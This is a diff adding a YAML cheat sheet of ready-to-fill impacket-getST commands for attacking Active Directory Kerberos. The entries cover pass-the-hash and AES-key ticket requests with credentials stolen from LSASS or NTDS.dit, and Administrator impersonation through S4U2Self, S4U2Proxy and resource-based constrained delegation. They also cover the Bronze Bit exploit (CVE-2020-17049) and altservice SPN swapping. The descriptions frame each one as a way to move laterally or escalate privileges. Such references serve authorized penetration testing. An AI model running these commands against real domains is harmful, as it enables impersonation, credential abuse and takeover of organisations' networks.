@@ -1,0 +1,73 @@
+tool: impacket-getst
+tags: [active-directory, kerberos, pentest, exploitation, security, authentication, impacket]
+
+actions:
+# === BASIC AUTHENTICATION SCENARIOS ===
+
+ - title: impacket-getST - Request ST using cleartext password
+   desc: |
+     Requests a Kerberos Service Ticket (ST) for a specific SPN using a valid domain username and password. 
+     This is the most basic usage of the tool when you have acquired credentials and need to access a remote service. 
+     The resulting ticket is saved as a .ccache file in the current directory, which can then be used with other tools by setting the KRB5CCNAME environment variable. 
+     Ensure the SPN is valid and reachable within the domain environment.
+   command: "impacket-getST {{domain}}/{{username}}:{{password}} -spn {{spn|cifs/target.domain.com}} -dc-ip {{dc_ip}}"
+
+ - title: impacket-getST - Request ST using NTLM hash (Pass-the-Hash)
+   desc: |
+     Obtains a Service Ticket by performing a Pass-the-Hash (PtH) authentication. 
+     This is useful in scenarios where the cleartext password is unknown but the NTLM hash has been extracted from memory or a SAM database. 
+     The hash must be provided in the LMHASH:NTHASH format; if the LM hash is unknown, use 32 zeros. 
+     This command facilitates lateral movement without needing the actual user password.
+   command: "impacket-getST {{domain}}/{{username}} -hashes {{hash}} -spn {{spn|cifs/target.domain.com}} -dc-ip {{dc_ip}}"
+
+ - title: impacket-getST - Request ST using AES Key
+   desc: |
+     Uses an AES128 or AES256 key for Kerberos authentication instead of a password or NTLM hash. 
+     This method is often more "stealthy" or required in environments where DES or NTLM is disabled and only AES is supported. 
+     The AES key is typically recovered from the LSASS process or a NTDS.dit file. 
+     Providing the AES key allows the tool to perform the initial AS-REQ/AS-REP exchange to get a TGT before requesting the specific ST.
+   command: "impacket-getST {{domain}}/{{username}} -aesKey {{aes_key}} -spn {{spn|cifs/target.domain.com}} -dc-ip {{dc_ip}}"
+
+# === DELEGATION AND IMPERSONATION ===
+
+ - title: impacket-getST - S4U2Self Impersonation
+   desc: |
+     Uses the Service-for-User-to-Self (S4U2Self) extension to request a service ticket for a target user. 
+     This is typically used when an account has constrained delegation configured or when performing specific Kerberos attacks. 
+     The impersonated user is usually a high-privileged account like 'Administrator'. 
+     Note that this only works if the identity providing the credentials is allowed to delegate to the specified SPN or is performing a self-query.
+   command: "impacket-getST {{domain}}/{{username}}:{{password}} -spn {{spn|cifs/target.domain.com}} -impersonate {{target_user|Administrator}} -dc-ip {{dc_ip}}"
+
+ - title: impacket-getST - Constrained Delegation (S4U2Proxy)
+   desc: |
+     Performs a full S4U2Proxy request to obtain a ticket for a service on behalf of another user. 
+     This requires the initial account to have the 'Trusted to authenticate for delegation' attribute (Constrained Delegation). 
+     It is a common technique for lateral movement where a compromised service account is used to impersonate a Domain Admin to another service. 
+     The tool handles the complex multi-step Kerberos exchange automatically.
+   command: "impacket-getST {{domain}}/{{username}}:{{password}} -spn {{spn|cifs/target.domain.com}} -impersonate {{target_user|Administrator}} -dc-ip {{dc_ip}}"
+
+ - title: impacket-getST - Resource-Based Constrained Delegation (RBCD)
+   desc: |
+     Exploits Resource-Based Constrained Delegation by providing an additional service ticket. 
+     In RBCD, the 'msDS-AllowedToDelegateTo' attribute is set on the target resource rather than the delegating account. 
+     This command requires an additional ticket (usually a TGT or ST) of the account that has permissions to delegate to the target. 
+     This is a powerful technique for escalating privileges from a computer account to a full administrative session on a target server.
+   command: "impacket-getST {{domain}}/{{username}}:{{password}} -spn {{spn|cifs/target.domain.com}} -impersonate {{target_user|Administrator}} -additional-ticket {{ticket_path|ticket.ccache}} -dc-ip {{dc_ip}}"
+
+# === ADVANCED EXPLOITATION ===
+
+ - title: impacket-getST - Bronze Bit Attack (CVE-2020-17049)
+   desc: |
+     Exploits the Bronze Bit vulnerability by forcing the service ticket to be forwardable. 
+     This allows an attacker to bypass the 'Kerberos-only' restriction in constrained delegation, which normally prevents S4U2Proxy from working if the user didn't use Kerberos. 
+     The -force-forwardable flag flips the forwardable bit in the ticket encrypted with the service's key. 
+     For best results, provide the hashes or AES keys of the service account to ensure the tool can re-encrypt the ticket properly.
+   command: "impacket-getST {{domain}}/{{username}} -hashes :{{nt_hash}} -spn {{spn|cifs/target.domain.com}} -impersonate {{target_user|Administrator}} -force-forwardable -dc-ip {{dc_ip}}"
+
+ - title: impacket-getST - Bypassing SPN restrictions with AltService
+   desc: |
+     Requests a ticket for one SPN but changes the service name (sname) in the resulting ticket using the -altservice flag. 
+     This is useful when you have delegation rights to a specific service (e.g., 'http/host.com') but you actually want to access a different service (e.g., 'cifs/host.com'). 
+     While the ticket is requested for the authorized service, the final .ccache will contain the 'altservice' name. 
+     This may fail if the target application server performs strict validation of the ticket's SPN field.
+   command: "impacket-getST {{domain}}/{{username}}:{{password}} -spn {{spn|http/web.domain.com}} -altservice {{alt_spn|cifs}} -dc-ip {{dc_ip}}"
